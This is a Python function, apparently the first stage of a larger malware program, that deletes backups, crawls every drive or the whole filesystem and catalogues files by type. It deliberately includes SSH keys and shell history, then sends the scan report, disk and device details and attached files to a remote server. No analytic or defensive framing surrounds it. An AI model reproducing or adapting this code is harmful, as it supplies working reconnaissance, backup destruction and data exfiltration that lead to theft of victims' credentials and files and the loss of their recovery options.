def stage1_scan():
    print(f"[*] Starting Stage 1: Scanning (Operation ID: {OPERATION_ID})...")
    PyLog(f"Stage 1: Scanning initiated. Operation ID: {OPERATION_ID}")
    remove_backups()
    start_time = time.time()
    roots = []
    if platform.system() == 'Windows':
        import string
        for letter in string.ascii_uppercase:
            if letter in ['A', 'B']: continue
            drive = f'{letter}:\\'
            if os.path.exists(drive):
                roots.append(drive)
    else:
        roots.append('/')
    def is_excluded(path):
        path_abs = os.path.abspath(path)
        path_lower = path_abs.lower()
        basename = os.path.basename(path).lower()
        if basename.startswith('.') and basename not in ['.ssh', '.bash_history', '.zsh_history']:
            return True
        for excl in EXCLUDE_DIRS.get(platform.system(), []):
            excl_lower = excl.lower()
            if '*' in excl_lower:
                import fnmatch
                if fnmatch.fnmatch(path_lower, excl_lower) or fnmatch.fnmatch(basename, excl_lower):
                    return True
                continue
            if ':' in excl_lower or excl_lower.startswith('\\') or excl_lower.startswith('/'):
                if path_lower.startswith(excl_lower):
                    return True
                continue
            for r in roots:
                r_lower = r.lower()
                excl_full = os.path.join(r_lower, excl_lower).lower()
                if path_lower == excl_full or path_lower.startswith(excl_full + os.sep):
                    return True
            if os.sep + excl_lower + os.sep in path_lower or path_lower.endswith(os.sep + excl_lower):
                return True
        if SELF_EXCLUDE_TAG in path_lower:
            return True
        return False
    report = {'operation_id': OPERATION_ID, 'device_info': INFO['device_info_str'], 'statistics': {'total_files_found': 0, 'total_size_bytes': 0, 'total_size_human': '0 MB'}, 'files_by_category': {cat: [] for cat in FILE_EXTENSIONS}}
    disk_summary = []
    for r in roots:
        try:
            total, used, free = shutil.disk_usage(r)
            disk_summary.append(f'{r} ({round(used / 1024 ** 3, 2)}/{round(total / 1024 ** 3, 2)} GB used)')
        except:
            continue
    for root_dir in roots:
        for root, dirs, files in os.walk(root_dir):
            dirs[:] = [d for d in dirs if not is_excluded(os.path.join(root, d))]
            if is_excluded(root):
                dirs[:] = []
                continue
            for file in files:
                ext = os.path.splitext(file)[1].lower()
                for cat, exts in FILE_EXTENSIONS.items():
                    if ext in exts:
                        path_file = os.path.join(root, file)
                        try:
                            if is_excluded(path_file):
                                continue
                            size = os.path.getsize(path_file)
                            report['files_by_category'][cat].append(path_file)
                            report['statistics']['total_files_found'] += 1
                            report['statistics']['total_size_bytes'] += size
                        except:
                            continue
    PyLog(f"Stage 1: Scan complete. Found {report['statistics']['total_files_found']} files.")
    report['statistics']['total_size_human'] = f"{round(report['statistics']['total_size_bytes'] / 1024 ** 2, 2)} MB"
    elapsed = round(time.time() - start_time, 2)
    with open(SCAN_REPORT, 'w') as f:
        json.dump(report, f, indent=4)
    cat_summary = []
    for cat, files in report['files_by_category'].items():
        if len(files) > 0:
            cat_summary.append(f'• {cat}: {len(files)}')
    payload_extra = {'file_count': str(report['statistics']['total_files_found']), 'total_size': report['statistics']['total_size_human'], 'scan_time': str(elapsed), 'disk_info': '\n'.join(disk_summary), 'categories': '\n'.join(cat_summary)}
    send_to_remote(status='scanned', payload_extra=payload_extra, attach_files=True)
